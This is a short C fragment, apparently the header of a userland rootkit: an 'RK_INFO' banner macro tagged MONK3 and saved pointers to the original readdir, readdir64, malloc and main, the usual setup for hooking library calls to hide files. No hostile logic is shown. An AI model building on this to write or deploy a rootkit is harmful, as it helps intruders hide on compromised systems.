#define RK_INFO "\e[1;31m[\e[0mMONK3\e[1;31m]\e[0m --> "

struct dirent *(*orig_readdir)(DIR *dir);
struct dirent64 *(*orig_readdir64)(DIR *dir);
static void *(*orig_malloc)(size_t) = NULL;
static int (*orig_main)(int, char **, char **);
